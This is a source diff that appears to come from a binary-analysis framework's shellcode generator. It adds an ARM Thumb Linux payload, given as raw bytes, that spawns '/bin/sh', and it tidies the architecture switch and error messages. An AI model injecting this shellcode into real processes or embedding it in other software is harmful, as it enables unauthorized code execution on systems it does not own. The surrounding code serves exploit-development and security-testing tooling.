@@ -51,6 +51,10 @@ static ut8 arm_linux_binsh[] =
 	"\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef"
 	"\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";
 
+static ut8 thumb_linux_binsh[] =
+	"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\x01\x90"
+	"\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"; // "/bin/sh";
+
 static RBuffer *build (REgg *egg) {
 	RBuffer *buf = r_buf_new ();
 	const ut8 *sc = NULL;
@@ -85,20 +89,35 @@ static RBuffer *build (REgg *egg) {
 		switch (egg->arch) {
 		case R_SYS_ARCH_X86:
 			switch (egg->bits) {
-			case 32: sc = x86_linux_binsh; break;
-			case 64: sc = x86_64_linux_binsh; break;
-			default: eprintf ("Unsupportted\n");
+			case 32: 
+				sc = x86_linux_binsh; 
+				break;
+			case 64: 
+				sc = x86_64_linux_binsh; 
+				break;
+			default: 
+				eprintf ("Unsupported arch %d bits\n", egg->bits);
 			}
 			break;
 		case R_SYS_ARCH_ARM:
-			sc = arm_linux_binsh;
+			switch (egg->bits) {
+			case 16:
+				sc = thumb_linux_binsh;
+				break;
+			case 32:
+				sc = arm_linux_binsh;
+				break;
+			default:
+				eprintf ("Unsupported arch %d bits\n", egg->bits);
+			}
 			break;
 		}
 		break;
 	default:
-		eprintf ("unsupported os %x\n", egg->os);
-		break;
+		eprintf ("Unsupported os %x\n", egg->os);
+		break;		
 	}
+
 	if (sc) {
 		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
 		if (shell && *shell) {
